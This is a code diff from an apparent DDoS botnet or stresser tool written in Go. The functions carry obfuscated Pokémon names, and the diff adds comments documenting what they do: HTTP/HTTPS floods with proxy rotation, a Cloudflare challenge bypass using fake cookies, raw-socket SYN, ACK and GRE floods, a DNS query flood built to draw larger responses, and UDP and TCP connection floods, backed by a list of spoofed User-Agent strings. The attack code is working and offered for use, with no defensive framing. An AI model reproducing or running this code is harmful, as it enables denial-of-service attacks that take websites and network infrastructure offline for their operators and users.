+	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+	"Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+	// ======================== WINDOWS 11 SPECIFIC ========================
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/117.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Vivaldi/7.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Brave/131",
+	// ======================== OLDER BUT COMMON (2024) ========================
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
@@ -1312,14 +1644,44 @@ var eevee = []string{
 	"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
 	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
 	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
+	"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
+	"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
+	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
+	"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
+	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
 }
 
-// performHTTPFlood => alakazam - Updated with proxy support
+// ============================================================================
+// L7 (APPLICATION LAYER) ATTACK FUNCTIONS
+// These perform HTTP/HTTPS floods to overwhelm web servers.
+// ============================================================================
+
+// alakazam performs HTTP flood attack (wrapper for alakazamProxy without proxy).
+// Parameters:
+//   - target: Target hostname or IP
+//   - targetPort: Target port (typically 80)
+//   - duration: Attack duration in seconds
 func alakazam(target string, targetPort, duration int) {
 	alakazamProxy(target, targetPort, duration, false)
 }
 
-// performHTTPFloodWithProxy => alakazamProxy - HTTP flood with optional proxy support
+// alakazamProxy performs HTTP POST flood with optional proxy rotation.
+// Spawns cozyBear (default 2024) concurrent workers sending POST requests.
+// In proxy mode, rotates proxies periodically to avoid IP blocking.
+// Parameters:
+//   - target: Target hostname or IP
+//   - targetPort: Target port (typically 80)
+//   - duration: Attack duration in seconds
+//   - useProxy: Enable proxy rotation from loaded proxy list
 func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 	rand.Seed(time.Now().UnixNano())
 	stopCh := raichu()
@@ -1389,12 +1751,23 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 	wg.Wait()
 }
 
-// performHTTPSFlood => machamp - Updated with proxy support
+// machamp performs HTTPS/TLS flood attack (wrapper for machampProxy without proxy).
+// Parameters:
+//   - target: Target hostname or IP
+//   - targetPort: Target port (typically 443)
+//   - duration: Attack duration in seconds
 func machamp(target string, targetPort, duration int) {
 	machampProxy(target, targetPort, duration, false)
 }
 
-// performHTTPSFloodWithProxy => machampProxy - HTTPS flood with optional proxy support
+// machampProxy performs HTTPS flood with TLS connection reuse and optional proxy support.
+// Uses TLS 1.2-1.3 and sends multiple HTTP requests per connection.
+// Randomizes: HTTP methods (GET/POST/HEAD), paths, and User-Agents.
+// Parameters:
+//   - target: Target hostname
+//   - targetPort: Target port (typically 443)
+//   - duration: Attack duration in seconds
+//   - useProxy: Enable proxy mode using loaded proxy list
 func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	rand.Seed(time.Now().UnixNano())
 	stopCh := raichu()
@@ -1554,12 +1927,22 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	wg.Wait()
 }
 
+// ============================================================================
+// SESSION MANAGEMENT FOR CF BYPASS
+// These structs and functions manage HTTP sessions with cookie persistence.
+// ============================================================================
+
+// ditto represents a browser session with cookies and persistent User-Agent.
+// Used for maintaining state across requests (required for Cloudflare bypass).
 type ditto struct {
-	cookies   []*http.Cookie
-	userAgent string
-	client    *http.Client
+	cookies   []*http.Cookie // Collected cookies from responses
+	userAgent string         // Consistent User-Agent for session
+	client    *http.Client   // HTTP client with cookie jar
 }
 
+// zorua creates a new browser session with cookie support.
+// Initializes an HTTP client with TLS config and cookie jar.
+// Returns: Configured ditto session ready for requests
 func zorua() *ditto {
 	jar, _ := zoroark()
 	return &ditto{
@@ -1584,7 +1967,13 @@ func zorua() *ditto {
 	}
 }
 
-// zoruaWithProxy => zorua with proxy support
+// zoruaWithProxy creates a browser session configured to use a proxy.
+// Same as zorua but routes all requests through the specified proxy.
+// Falls back to non-proxy session if proxy URL is invalid.
+// Parameters:
+//   - proxyAddr: Proxy URL (http://ip:port or with auth)
+//
+// Returns: Configured ditto session with proxy support
 func zoruaWithProxy(proxyAddr string) *ditto {
 	jar, _ := zoroark()
 	proxyURL, err := url.Parse(proxyAddr)
@@ -1614,27 +2003,39 @@ func zoruaWithProxy(proxyAddr string) *ditto {
 	}
 }
 
+// zoroark creates a new cookie jar for session management.
+// Returns: Thread-safe cookie jar implementation
 func zoroark() (http.CookieJar, error) {
 	return &mimikyu{cookies: make(map[string][]*http.Cookie)}, nil
 }
 
+// mimikyu implements http.CookieJar interface for storing cookies per host.
+// Thread-safe using mutex for concurrent access.
 type mimikyu struct {
 	mu      sync.Mutex
 	cookies map[string][]*http.Cookie
 }
 
+// SetCookies stores cookies for a URL's host.
 func (j *mimikyu) SetCookies(u *url.URL, cookies []*http.Cookie) {
 	j.mu.Lock()
 	defer j.mu.Unlock()
 	j.cookies[u.Host] = append(j.cookies[u.Host], cookies...)
 }
 
+// Cookies returns stored cookies for a URL's host.
 func (j *mimikyu) Cookies(u *url.URL) []*http.Cookie {
 	j.mu.Lock()
 	defer j.mu.Unlock()
 	return j.cookies[u.Host]
 }
 
+// gastly attempts to bypass Cloudflare protection by following the JS challenge flow.
+// Makes initial request, waits if challenged (503/403), then retries with cookies.
+// Parameters:
+//   - targetURL: Full URL to access and bypass
+//
+// Returns: error if bypass fails
 func (s *ditto) gastly(targetURL string) error {
 	req, err := http.NewRequest("GET", targetURL, nil)
 	if err != nil {
@@ -1667,12 +2068,24 @@ func (s *ditto) gastly(targetURL string) error {
 	return nil
 }
 
-// performCFBypass => gyarados - Updated with proxy support
+// gyarados performs Cloudflare bypass flood (wrapper for gyaradosProxy without proxy).
+// Parameters:
+//   - target: Target hostname
+//   - targetPort: Target port (typically 443)
+//   - duration: Attack duration in seconds
 func gyarados(target string, targetPort, duration int) {
 	gyaradosProxy(target, targetPort, duration, false)
 }
 
-// performCFBypassWithProxy => gyaradosProxy - CF bypass with optional proxy support
+// gyaradosProxy performs Cloudflare bypass flood with session management.
+// Each worker maintains a persistent session with cookies.
+// Attempts to solve CF JS challenges before flooding with requests.
+// Adds fake __cf_bm cookies to appear as legitimate traffic.
+// Parameters:
+//   - target: Target hostname
+//   - targetPort: Target port (typically 443)
+//   - duration: Attack duration in seconds
+//   - useProxy: Enable proxy rotation for each session
 func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	rand.Seed(time.Now().UnixNano())
 	stopCh := raichu()
@@ -1764,7 +2177,19 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	wg.Wait()
 }
 
-// performSYNFlood => dragonite
+// ============================================================================
+// L4 (TRANSPORT LAYER) ATTACK FUNCTIONS
+// These perform raw packet floods to overwhelm network infrastructure.
+// Require root/CAP_NET_RAW capability for raw socket access.
+// ============================================================================
+
+// dragonite performs a TCP SYN flood attack using raw sockets.
+// Sends SYN packets with random source ports and sequence numbers.
+// Maximum payload size to amplify bandwidth consumption.
+// Parameters:
+//   - targetIP: Target IP address or hostname
+//   - targetPort: Target TCP port
+//   - duration: Attack duration in seconds
 func dragonite(targetIP string, targetPort, duration int) {
 	rand.Seed(time.Now().UnixNano())
 	resolvedIP, err := lucario(targetIP)
@@ -1810,7 +2235,15 @@ func dragonite(targetIP string, targetPort, duration int) {
 	wg.Wait()
 }
 
-// performACKFlood => tyranitar
+// tyranitar performs a TCP ACK flood attack using raw sockets.
+// ACK floods can bypass some SYN flood protections.
+// Sends ACK packets with random sequence and acknowledgment numbers.
+// Parameters:
+//   - targetIP: Target IP address or hostname
+//   - targetPort: Target TCP port
+//   - duration: Attack duration in seconds
+//
+// Returns: error if target resolution fails
 func tyranitar(targetIP string, targetPort int, duration int) error {
 	rand.Seed(time.Now().UnixNano())
 	resolvedIP, err := lucario(targetIP)
@@ -1857,7 +2290,14 @@ func tyranitar(targetIP string, targetPort int, duration int) error {
 	return nil
 }
 
-// performGREFlood => metagross
+// metagross performs a GRE (Generic Routing Encapsulation) protocol flood.
+// GRE floods are effective against routers and can cause routing issues.
+// Uses raw IP sockets with protocol 47 (GRE).
+// Parameters:
+//   - targetIP: Target IP address or hostname
+//   - duration: Attack duration in seconds
+//
+// Returns: error if target resolution fails
 func metagross(targetIP string, duration int) error {
 	rand.Seed(time.Now().UnixNano())
 	resolvedIP, err := lucario(targetIP)
@@ -1904,7 +2344,14 @@ func metagross(targetIP string, duration int) error {
 	return nil
 }
 
-// performDNSFlood => salamence
+// salamence performs a DNS query flood attack.
+// Sends random DNS queries to overwhelm DNS servers.
+// Randomizes: query domains, query types (A, AAAA, MX, NS).
+// Includes EDNS0 extension for larger response sizes.
+// Parameters:
+//   - targetIP: Target DNS server IP or hostname
+//   - targetPort: Target port (typically 53)
+//   - duration: Attack duration in seconds
 func salamence(targetIP string, targetPort, duration int) {
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
@@ -1950,7 +2397,13 @@ func salamence(targetIP string, targetPort, duration int) {
 	wg.Wait()
 }
 
-// constructDNSQuery => garchomp
+// garchomp constructs a DNS query message for the flood attack.
+// Adds EDNS0 OPT record to request larger UDP responses.
+// Parameters:
+//   - domain: Domain name to query
+//   - queryType: DNS query type (A=1, AAAA=28, MX=15, NS=2)
+//
+// Returns: Constructed DNS message ready to pack and send
 func garchomp(domain string, queryType uint16) *dns.Msg {
 	msg := new(dns.Msg)
 	msg.SetQuestion(dns.Fqdn(domain), queryType)
@@ -1962,7 +2415,13 @@ func garchomp(domain string, queryType uint16) *dns.Msg {
 	return msg
 }
 
-// performUDPFlood => snorlax
+// snorlax performs a UDP flood attack.
+// Opens multiple UDP connections and sends fixed-size payloads.
+// Simpler than raw socket attacks but effective against UDP services.
+// Parameters:
+//   - targetIP: Target IP address or hostname
+//   - targetPort: Target UDP port
+//   - duration: Attack duration in seconds
 func snorlax(targetIP string, targetPort, duration int) {
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
@@ -2001,7 +2460,13 @@ func snorlax(targetIP string, targetPort, duration int) {
 	wg.Wait()
 }
 
-// TCPfloodAttack => gengar
+// gengar performs a TCP connection flood attack.
+// Opens TCP connections and sends minimal HTTP-like data.
+// Targets connection table exhaustion on the victim.
+// Parameters:
+//   - targetIP: Target IP address or hostname
+//   - targetPort: Target TCP port
+//   - duration: Attack duration in seconds
 func gengar(targetIP string, targetPort, duration int) {
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
